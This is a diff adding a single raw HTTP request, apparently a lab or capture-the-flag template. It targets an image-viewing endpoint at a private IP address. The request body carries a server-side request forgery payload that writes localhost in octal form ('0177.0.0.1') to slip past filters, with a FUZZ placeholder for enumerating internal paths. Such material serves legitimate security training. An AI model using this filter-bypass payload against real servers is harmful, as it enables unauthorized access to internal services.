@@ -1,0 +1,16 @@
+POST /view_image HTTP/1.1
+Host: 10.10.229.49:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.229.49:8080
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://10.10.229.49:8080/dejaview
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+www=http://0177.0.0.1:80/FUZZ
